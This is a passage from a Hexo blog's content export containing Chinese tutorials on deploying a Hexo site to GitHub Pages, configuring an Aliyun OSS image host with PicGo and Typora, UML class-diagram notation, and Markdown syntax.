<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h2 id="Hexo初始化博客">Hexo初始化博客</h2>
<ol>
<li>
<p>初始化</p>
<p>安装完毕hexo，此时可以选择一个空文件夹建立博客站点框架。执行下面命令，Hexo 将会在指定文件夹中新建所需要的文件。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo init <span class="token operator">&lt;</span>folder<span class="token operator">&gt;</span>
$ <span class="token builtin class-name">cd</span> <span class="token operator">&lt;</span>folder<span class="token operator">&gt;</span>
$ <span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>执行后Hexo将会在<code>&lt;folder&gt;</code>文件夹建立站点文件。若 <code>&lt;folder&gt;</code>为空，将在当前文件夹建立站点</p>
<p>此时，指定文件夹将会出现如下文件目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span>
├── _config.yml
├── package.json
├── scaffolds
├── <span class="token builtin class-name">source</span>
<span class="token operator">|</span>   ├── _drafts
<span class="token operator">|</span>   └── _posts
└── themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中，有几个文件极为重要：</p>
<ul>
<li><code>_config.yml</code> 该文件为网站配置信息，包括网站标题、作者、时间、语言、主题等重要配置和功能。</li>
<li><code>source/_posts/*.md</code><br>
<code>source</code> 文件夹为博文的资源文件夹，其中的<code>_posts</code>文件夹储存了<code>markdown</code>文件为网站博文。</li>
<li><code>themes</code> 文件夹储存了第三方主题。</li>
</ul>
</li>
<li>
<p>测试初始化结果</p>
<p>建立博文</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">$ hexo new "welcome"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>此时 <code>/source/_posts</code> 文件夹中建立了 <code>welcome.md</code> 文件。接着运行</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>此时命令行提示</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INFO  Validating config
INFO  Start processing
INFO  Hexo is running at http://localhost:4000/ <span class="token builtin class-name">.</span> Press Ctrl+C to stop.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>说明网站已成功在本地部署（ <code>http://localhost:4000/</code>），可在命令行执行Crtl+C 停止网站运行。</p>
</li>
<li>
<p>GithubPage部署</p>
<ul>
<li>
<p>在github账号下建立名为 <code>&lt;github 用户名&gt;.github.io</code>的仓库（这将是之后的访问网址），可以使用readme.md进行初始化。</p>
</li>
<li>
<p>设置ssh登录。在命令行中输入<code>$ ssh-keygen -t rsa -C "GitHub注册邮箱"</code>直接三个回车，不需要密码。这时在 <code>C:/Users/&lt;用户名&gt;/.ssh</code> 文件夹下会建立公钥 <code>id_rsa.pub</code> 文件，将其中内容全部复制。打开<code>Github Settings keys</code>页面，点击<code>new SSH key</code>，填写任意 <code>title</code> 和刚才复制的公钥信息，并<code>Add SSH key</code>，</p>
</li>
<li>
<p>此时打开Git Bash，输入<code>ssh git@github.com</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> git@github.com
PTY allocation request failed on channel <span class="token number">0</span>
Hi hmxyl<span class="token operator">!</span> You've successfully authenticated, but GitHub does not provide shell access.
Connection to github.com closed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>参考：<a href="https://support.atlassian.com/bitbucket-cloud/docs/set-up-an-ssh-key">https://support.atlassian.com/bitbucket-cloud/docs/set-up-an-ssh-key</a></p>
<p>自定义密钥名称&lt;private_key_file&gt;（非id_rsa），后<code>ssh git@github.com</code>提示<code>permission denied</code></p>
<ul>
<li>To start the agent, run the following:</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">eval</span> <span class="token variable"><span class="token variable">$(</span>ssh-agent<span class="token variable">)</span></span> 
Agent pid <span class="token number">9700</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>Enter ssh-add followed by the path to the private key file:</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ssh-add ~/.ssh/<span class="token operator">&lt;</span>private_key_file<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
</li>
<li>
<p>进入博客文件夹，在 <code>_config.yml</code> 文件中修改<code>deploy</code>块的信息</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span>
  <span class="token key atrule">type</span><span class="token punctuation">:</span> git
  <span class="token key atrule">repo</span><span class="token punctuation">:</span> git@github.com<span class="token punctuation">:</span>hmxyl/hmxyl.github.io.git
  <span class="token key atrule">branch</span><span class="token punctuation">:</span> main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>在博客文件夹下打开命令行，安装部署到github.io的依赖</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>部署整个博客</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo clean
$ hexo generate
$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或者合并命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$  hexo clean <span class="token operator">&amp;&amp;</span> hexo generate <span class="token operator">&amp;&amp;</span> hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>此时主目录下出现<code>.deploy_git</code>文件夹，该文件夹与github仓库中的文件一致，为页面文件。此时访问 <code>Github用户名.github.io</code> 即可打开博客网页。</p>
<p>每次部署完，Github通常需要几分钟更新网站，此时多刷新几次网站即可</p>
</li>
</ol>
<h1>阿里云OSS开通及配置</h1>
<p>参考：<a href="https://www.cnblogs.com/NFTO21/p/16285829.html">阿里云OSS+PicGo-Core搭建图床，配合Typora、Obsidian食用</a></p>
<h3 id="开通及购买服务包">开通及购买服务包</h3>
<p>登录<a href="https://www.aliyun.com/">阿里云</a>官网，开通对象存储OSS，开通对象存储OSS不用扣费，只有使用OSS才需要扣费。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130369-127071567.png" alt="image-20220516143447765"></p>
<p>OSS有两种扣费方式（<a href="https://help.aliyun.com/document_detail/48259.html">产品计费详细介绍</a>）：</p>
<ul>
<li><a href="https://www.aliyun.com/price/product?spm=5176.7933691.J_5253785160.5.6a834c59NplAsJ#/oss/detail/ossbag">按量付费</a></li>
<li><a href="https://www.aliyun.com/price/product?spm=5176.7933691.J_5253785160.5.6a834c59NplAsJ#/oss/detail/ossbag">包年包月（资源包）</a></li>
</ul>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130305-2102262967.png" alt="image-20220516144229920"></p>
<p>根据需要<a href="https://common-buy.aliyun.com/?spm=5176.7933691.J_5253785160.2.6a834c59JnWmz4&amp;commodityCode=ossbag#/buy">按需购买</a>对应的资源包即可：（搭建个人图床，购买 40G容量5年（45元）+ 5年 的 100万接口上传次数/年（5元） ）</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130288-239354371.png" alt="image-20220516144601693"></p>
<h3 id="基础配置">基础配置</h3>
<h4 id="创建Bucket">创建Bucket</h4>
<p>打开<a href="https://oss.console.aliyun.com/bucket">OSS管理控制台Bucket页面</a>，按需创建一个Bucket。<br>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130538-1554992822.png" alt="image-20220516152551602"></p>
<p>创建Bucket成功</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130203-786734777.png" alt="image-20220516154556221"></p>
<h4 id="Bucket图片上传及访问">Bucket图片上传及访问</h4>
<p>进入新建的Bucket，在文件管理-&gt;上传文件中即可开始上传文件，</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130324-816099928.png" alt="image-20220516155157249"><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130545-1477425769.png" alt="image-20220516155507591"></p>
<p>点击详情，即可看到上传图片的URL，复制URL到浏览器中访问图片。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130375-920098593.png" alt="image-20220516160202041"></p>
<h3 id="AccessKey配置">AccessKey配置</h3>
<h4 id="创建子用户和AccessKey">创建子用户和AccessKey</h4>
<p>鼠标移动到头像上即可看到<strong>AccessKey管理</strong>，打开管理页面，</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130218-1943488233.png" alt="image-20220516171100691"></p>
<p><strong>推荐使用子账户创建的AccessKey</strong>（<a href="https://ram.console.aliyun.com/users">RAM 访问控制 </a>中创建子账户）<br>
<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130421-634915099.png" alt="image-20220516171247987"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130422-386866137.png" alt="image-20220516172210041"></p>
<p>选中刚才创建的子用户，即可创建<strong>AccessKey</strong>并获取<strong>AccessKey Secret</strong>。</p>
<blockquote>
<p><strong>AccessKey Secret只能查看一次哦，建议复制到自己本地存储，后面PicGo-Core配置需要使用到</strong></p>
</blockquote>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130493-1428718749.png" alt="image-20220516172517201"></p>
<h4 id="Bucket授权子用户权限">Bucket授权子用户权限</h4>
<p>进入权限管理页面，</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130396-775910505.png" alt="image-20220516173811851"></p>
<p>配置子用户权限，按需勾选即可，</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2323423-20220518181130449-866487166.png" alt="image-20220516174245990"></p>
<p><strong>至此，图床所需的所有配置已弄完</strong></p>
<h3 id="下载OSS-管理工具oss-browser">下载OSS 管理工具<code>oss-browser</code></h3>
<ol>
<li>
<p>下载： <a href="https://gosspublic.alicdn.com/oss-browser/1.16.0/oss-browser-win32-x64.zip?spm=5176.8466032.help.16.50a01450Brdxse&amp;file=oss-browser-win32-x64.zip">oss-browser</a></p>
</li>
<li>
<p>登录</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>AccesskeyId</td>
<td>创建RAM用户时的 AccessKey ID</td>
</tr>
<tr>
<td>AccessKeySecret</td>
<td>创建RAM用户时的 AccessKey Secret</td>
</tr>
<tr>
<td>预设OSS 路径</td>
<td><code>oss://创建的Bucket名称</code></td>
</tr>
</tbody>
</table>
</li>
</ol>
<h1><a href="https://picgo.github.io/PicGo-Doc/">PicGo</a> 安装及图床配置</h1>
<ol>
<li>
<p>安装：参考<a href="https://picgo.github.io/PicGo-Doc/">PicGo安装</a></p>
</li>
<li>
<p>配置图床</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>设定keyId</td>
<td>创建RAM用户时的 AccessKey ID</td>
</tr>
<tr>
<td>设定KeySecret</td>
<td>创建RAM用户时的 AccessKey Secret</td>
</tr>
<tr>
<td>设定储存空间名</td>
<td>新建的Bucket名称</td>
</tr>
<tr>
<td>确定存储区域</td>
<td>创建的Bucket详情中查看：<code>地域节点</code>  中的二级域名 <code>oss-cn-城市</code></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>测试上传一张图片</p>
</li>
</ol>
<h1>Typora 中 上传图片配置</h1>
<p>配置： 文件-&gt; 偏好设置-&gt;图像</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027172837218.png" alt="image-20221027172837218"></p>
<h1>链接地址不唯一，无法依赖引用</h1>
<h2 id="原有的链接格式">原有的链接格式</h2>
<p>Hexo根目录下<code>_config.yml</code>原有的链接地址生成方式 <code>permalink: :year/:month/:day/:title/</code>, 其中title为 <code>front-matter</code>内的title，而非文件的名称。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230317150229481-1679222650307-8.png" alt="front-matter内的title"></p>
<h2 id="采用hexo-abbrlink实现永久唯一链接">采用hexo-abbrlink实现永久唯一链接</h2>
<ol>
<li>
<p>安装abbrlink插件</p>
<p><code>npm install hexo-abbrlink --save </code></p>
<p>安装后，<strong>hexo</strong> **会自动（保存文章时、或者hexo g时都可以）**在front-matter中自动加入<code>abbrlink</code>字段。</p>
<p><code>abbrlink</code>一旦生成，即使修改title，其内容也不会再更改了，除非将<code>abbrlink</code>字段手动删除，然后hexo会重新根据title自动生成</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230317150430466-1679222650306-6.png" alt="image-20230317150430466"></p>
</li>
<li>
<p>_<strong><code>config.yml</code></strong> 中修改 <code>permalink</code> 并定义 <code>abbrlink</code></p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"># permalink: :year/:month/:day/:title/

permalink: :year:month:day/:abbrlink.html     # 将原来文章的地址修改为这个，并添加如下abbrlink
abbrlink:
  alg: crc32      #support crc16(default) and crc32
  rep: hex        #support dec(default) and hex
  drafts: false   #(true)Process draft,(false)Do not process draft. false(default) 
  # Generate categories from directory-tree
  # depth: the max_depth of directory-tree you want to generate, should &gt; 0
  auto_category:
     enable: true  #true(default)
     depth:        #3(default)
     over_write: false 
  auto_title: false #enable auto title, it can auto fill the title by path
  auto_date: true #enable auto date, it can auto fill the date by time today
  force: false #enable force mode,in this mode, the plugin will ignore the cache, and calc the abbrlink for every post even it already had abbrlink. This only updates abbrlink rather than other front variables.
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>问题记录</h1>
<h2 id="运行Hexo报错hexo-无法加载文件hexo-ps1，因为在此系统上禁止运行脚本">运行Hexo报错hexo : 无法加载文件hexo.ps1，因为在此系统上禁止运行脚本</h2>
<ul>
<li>
<p>问题描述</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">87897</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>xavierjiezou.github.io<span class="token operator">&gt;</span> hexo s
hexo <span class="token builtin class-name">:</span> 无法加载文件 C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">87897</span><span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>npm<span class="token punctuation">\</span>hexo.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID
<span class="token operator">=</span><span class="token number">135170</span> 中的 about_Execution_Policies。
所在位置 行:1 字符: <span class="token number">1</span>
+ hexo s
+ ~~~~
    + CategoryInfo          <span class="token builtin class-name">:</span> SecurityError: <span class="token punctuation">(</span>:<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>，PSSecurityException
    + FullyQualifiedErrorId <span class="token builtin class-name">:</span> UnauthorizedAccess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>解决方案</p>
<p>设置-&gt;隐私和安全性-&gt;开发者选项-&gt;允许本地PowerShell脚本在为签名的情况下运行</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWGF2aWVyIEppZXpvdQ==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt=""></p>
</li>
<li>
<p>引用参考<br>
<a href="https://blog.csdn.net/qq_42951560/article/details/123678786">https://blog.csdn.net/qq_42951560/article/details/123678786</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>UML类图与接口图的表示</title>
    <url>/20221025/c9ac90bb.html</url>
    <content><![CDATA[<h1>类图</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182132103.png" alt="image-20221027182132103"></p>
<pre class="line-numbers language-none"><code class="language-none">①访问修饰符

	+ ：public
	-： private
	# : protected（friendly也归入这类）

② + a : int = defaultValue解读

	a：成员变量名
	int： 变量名的类型
	defaultValue： 为a的默认值

③ + operation1(int params):returnType解读
	operation1： 方法名
	params： 方法参数名
	reternType： 返回值类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>抽象类图</h1>
<p>注意，名称为斜体</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182148176.png" alt="image-20221027182148176"></p>
<h1>接口图</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182201862.png" alt="image-20221027182201862"></p>
<h1>类之间的关系</h1>
<h2 id="泛化（继承）关系">泛化（继承）关系</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182221807.png" alt="image-20221027182221807"></p>
<h2 id="实现关系">实现关系</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182231520.png" alt="image-20221027182231520"></p>
<h2 id="关联关系">关联关系</h2>
<h3 id="单关联关系">单关联关系</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213344266.png" alt="在这里插入图片描述"></p>
<h3 id="双向关联关系">双向关联关系</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213410395.png" alt="在这里插入图片描述"></p>
<h3 id="自关联">自关联</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20221027182248199.png" alt="image-20221027182248199"></p>
<h3 id="聚合关系">聚合关系</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213520120.png" alt="在这里插入图片描述"></p>
<h2 id="组合关系">组合关系</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200908213538273.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>UML</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown使用语法记录</title>
    <url>/20221025/ea43daec.html</url>
    <content><![CDATA[<h1>目录</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">开头输入<span class="token code-snippet code keyword">` [TOC]`</span>， 根据标题生成目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>标题</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">#</span> 一级标题</span>
<span class="token title important"><span class="token punctuation">##</span> 二级标题</span>
<span class="token title important"><span class="token punctuation">###</span> 三级标题</span>
<span class="token title important"><span class="token punctuation">####</span> 四级标题</span>
<span class="token title important"><span class="token punctuation">#####</span> 五级标题</span>
<span class="token title important"><span class="token punctuation">######</span> 六级标题</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>段落</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">段落的换行是使用两个以上空格加上回车。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>字体</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token italic"><span class="token punctuation">*</span><span class="token content">斜体文本</span><span class="token punctuation">*</span></span>
<span class="token bold"><span class="token punctuation">**</span><span class="token content">粗体文本</span><span class="token punctuation">**</span></span>
<span class="token bold"><span class="token punctuation">**</span><span class="token content"><span class="token italic"><span class="token punctuation">*</span><span class="token content">粗斜体文本</span><span class="token punctuation">*</span></span></span><span class="token punctuation">**</span></span>
<span class="token italic"><span class="token punctuation">_</span><span class="token content">斜体文本</span><span class="token punctuation">_</span></span>
<span class="token bold"><span class="token punctuation">__</span><span class="token content">粗体文本</span><span class="token punctuation">__</span></span>
<span class="token bold"><span class="token punctuation">__</span><span class="token content"><span class="token italic"><span class="token punctuation">_</span><span class="token content">粗斜体文本</span><span class="token punctuation">_</span></span></span><span class="token punctuation">__</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>分隔线</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。
也可以在星号或是减号中间插入空格。
下面每种写法都可以建立分隔线：

<span class="token hr punctuation">***</span>
<span class="token hr punctuation">* * *</span>
<span class="token hr punctuation">*****</span>
<span class="token title important">- - -
<span class="token punctuation">----------</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>删除线</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token strike"><span class="token punctuation">~~</span><span class="token content">删除文字</span><span class="token punctuation">~~</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>高亮</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">==highlight==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>下划线</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>u</span><span class="token punctuation">&gt;</span></span>带下划线文本<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>u</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>脚注</h1>
<pre class="line-numbers language-none"><code class="language-none">[^要注明的文本]


举例：
下面是要标记脚注[^脚注]的测试段落。可以在多个位置使用同一个脚注[^脚注]。脚注[^脚注]内容会自动到页面底部。
[^脚注]:脚注说明内容，需要独立一行。下面一行空着。
1
2
3
再次使用同一个脚注[^脚注]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果：<br>
下面是要标记脚注<a href="%E8%84%9A%E6%B3%A8%E8%AF%B4%E6%98%8E%E5%86%85%E5%AE%B9%EF%BC%8C%E9%9C%80%E8%A6%81%E7%8B%AC%E7%AB%8B%E4%B8%80%E8%A1%8C%E3%80%82%E4%B8%8B%E9%9D%A2%E4%B8%80%E8%A1%8C%E7%A9%BA%E7%9D%80%E3%80%82">^脚注</a>的测试段落。可以在多个位置使用同一个脚注<a href="%E8%84%9A%E6%B3%A8%E8%AF%B4%E6%98%8E%E5%86%85%E5%AE%B9%EF%BC%8C%E9%9C%80%E8%A6%81%E7%8B%AC%E7%AB%8B%E4%B8%80%E8%A1%8C%E3%80%82%E4%B8%8B%E9%9D%A2%E4%B8%80%E8%A1%8C%E7%A9%BA%E7%9D%80%E3%80%82">^脚注</a>。脚注<a href="%E8%84%9A%E6%B3%A8%E8%AF%B4%E6%98%8E%E5%86%85%E5%AE%B9%EF%BC%8C%E9%9C%80%E8%A6%81%E7%8B%AC%E7%AB%8B%E4%B8%80%E8%A1%8C%E3%80%82%E4%B8%8B%E9%9D%A2%E4%B8%80%E8%A1%8C%E7%A9%BA%E7%9D%80%E3%80%82">^脚注</a>内容会自动到页面底部。</p>
<p>1<br>
2<br>
3<br>
再次使用同一个脚注<a href="%E8%84%9A%E6%B3%A8%E8%AF%B4%E6%98%8E%E5%86%85%E5%AE%B9%EF%BC%8C%E9%9C%80%E8%A6%81%E7%8B%AC%E7%AB%8B%E4%B8%80%E8%A1%8C%E3%80%82%E4%B8%8B%E9%9D%A2%E4%B8%80%E8%A1%8C%E7%A9%BA%E7%9D%80%E3%80%82">^脚注</a></p>
<h1>无序列表</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">星号(*)、加号(+)或是减号(-)作为列表标记，标记后面添加一个空格

举例：

<span class="token list punctuation">*</span> 第一项
<span class="token list punctuation">*</span> 第二项
<span class="token list punctuation">*</span> 第三项

<span class="token list punctuation">+</span> 第一项
<span class="token list punctuation">+</span> 第二项
<span class="token list punctuation">+</span> 第三项


<span class="token list punctuation">-</span> 第一项
<span class="token list punctuation">-</span> 第二项
<span class="token list punctuation">-</span> 第三项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>有序列表</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">有序列表使用数字并加上 . 号来表示，如：

<span class="token list punctuation">1.</span> 第一项
<span class="token list punctuation">2.</span> 第二项
<span class="token list punctuation">3.</span> 第三项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>列表嵌套</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">列表嵌套只需在子列表中的选项前面添加四个空格即可：
举例：
<span class="token list punctuation">1.</span> 第一项：
    <span class="token list punctuation">-</span> 第一项嵌套的第一个元素
    <span class="token list punctuation">-</span> 第一项嵌套的第二个元素
<span class="token list punctuation">2.</span> 第二项：
    <span class="token list punctuation">-</span> 第二项嵌套的第一个元素
    <span class="token list punctuation">-</span> 第二项嵌套的第二个元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>区块</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号：

<span class="token blockquote punctuation">&gt;</span> 区块引用
<span class="token blockquote punctuation">&gt;</span> 菜鸟教程
<span class="token blockquote punctuation">&gt;</span> 学的不仅是技术更是梦想<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>最外层</p>
<blockquote>
<p>第一层嵌套</p>
<blockquote>
<p>第二层嵌套</p>
</blockquote>
</blockquote>
</blockquote>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">另外区块是可以嵌套的，一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套：

<span class="token blockquote punctuation">&gt;</span> 最外层
<span class="token blockquote punctuation">&gt; &gt;</span> 第一层嵌套
<span class="token blockquote punctuation">&gt; &gt; &gt;</span> 第二层嵌套
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>最外层</p>
<blockquote>
<p>第一层嵌套</p>
<blockquote>
<p>第二层嵌套</p>
</blockquote>
</blockquote>
</blockquote>
<h1>区块中使用列表</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token blockquote punctuation">&gt;</span> 区块中使用列表
<span class="token blockquote punctuation">&gt;</span> <span class="token list punctuation">1.</span> 第一项
<span class="token blockquote punctuation">&gt;</span> <span class="token list punctuation">2.</span> 第二项
<span class="token blockquote punctuation">&gt;</span> <span class="token list punctuation">+</span> 第一项
<span class="token blockquote punctuation">&gt;</span> <span class="token list punctuation">+</span> 第二项
<span class="token blockquote punctuation">&gt;</span> <span class="token list punctuation">+</span> 第三项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>区块中使用列表</p>
<ol>
<li>第一项</li>
<li>第二项</li>
</ol>
<ul>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ul>
</blockquote>
<h1>复选框</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">使用 - [ ] 和 - [x] 语法可以创建复选框，实现 todo-list 等功能。例如：

 <span class="token list punctuation">-</span> [x] 已完成事项
 <span class="token list punctuation">-</span> [ ] 待办事项1
 <span class="token list punctuation">-</span> [ ] 待办事项2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>[ ] 已完成事项</li>
<li>[ ] 待办事项1</li>
<li>[x] 待办事项2</li>
</ul>
<h1>列表中使用区块</h1>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">需要在 &gt; 前添加四个空格的缩进。

列表中使用区块实例如下：

<span class="token list punctuation">*</span> 第一项
    &gt; 菜鸟教程
    &gt; 学的不仅是技术更是梦想
<span class="token list punctuation">*</span> 第二项
